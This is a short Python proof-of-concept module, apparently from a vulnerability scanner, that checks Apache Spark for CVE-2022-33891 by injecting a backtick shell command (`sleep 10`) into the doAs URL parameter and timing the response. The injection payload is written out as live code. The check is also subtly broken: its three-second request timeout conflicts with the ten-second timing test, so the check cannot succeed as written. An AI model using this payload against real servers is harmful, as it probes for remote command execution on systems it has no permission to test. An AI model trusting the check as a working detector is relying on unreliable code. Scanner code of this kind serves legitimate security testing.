import requests
import time

from payload import headers


class ApacheSpark:

    def __init__(self):

        self.software = ["Apache Spark"]
        self.vul_list = ["CVE-2022-33891"]


    def poc_cve_2022_33891(self,basic_url):


        url = f"{basic_url}/?doAs=`sleep 10`"
        start_time = time.time()
        req = requests.get(url=url, headers=headers, verify=False, timeout=3)

        end_time = time.time()
        runtime = int(end_time - start_time)

        if runtime >= 10:
            return True
        else:
            return False